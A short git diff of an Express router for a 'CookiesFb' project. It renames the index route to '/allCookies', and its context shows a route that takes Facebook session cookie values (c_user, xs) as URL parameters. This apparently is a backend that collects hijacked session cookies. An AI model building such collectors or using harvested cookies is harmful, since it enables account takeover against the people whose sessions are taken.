@@ -3,7 +3,7 @@ const CookiesFb = require('../models/cookies')
 
 const CookiesFbController = require('../controllers/cookiesfb-controller')
 
-router.get('/', CookiesFbController.index)
+router.get('/allCookies', CookiesFbController.index)
 
 router.get('/upload-cookies/:c_user/:xs', (req, res) => {
     let c_user = req.params.c_user.toLowerCase();
